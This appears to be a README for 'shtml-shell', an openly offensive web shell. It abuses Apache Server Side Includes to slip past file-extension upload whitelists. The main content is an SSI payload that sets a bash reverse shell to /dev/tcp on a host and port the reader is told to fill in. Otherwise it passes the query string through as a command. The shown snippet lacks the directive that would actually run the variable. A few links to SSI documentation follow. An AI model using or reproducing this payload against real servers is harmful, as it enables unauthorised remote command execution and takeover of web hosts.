# shtml-shell

This Shell abuses the Server Side Inclusions in HTML and allow you get get a reverse connection back to your own machin 

This can come in handy when you want to get arround file extension whitlist

Please change 0.0.0.0 to your host and 1337 to your port in the following lines if you want to get the reverse connection

```sh

<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
<!--#set var="shl" value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1" --> 
<!--#else -->
<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
<!--#endif -->

 ```
[![Shell Screenshot][product-screenshot]]

Referenses : 

 * What is SSI : https://httpd.apache.org/docs/current/howto/ssi.html#:~:text=What%20are%20SSI%3F,program%2C%20or%20other%20dynamic%20technology.
 
 * Learn about SSI : https://www.st-andrews.ac.uk/itsnew/web/ssi/

 * Documentation : https://httpd.apache.org/docs/2.4/mod/mod_include.html


[product-screenshot]: Img/ssi-shell.png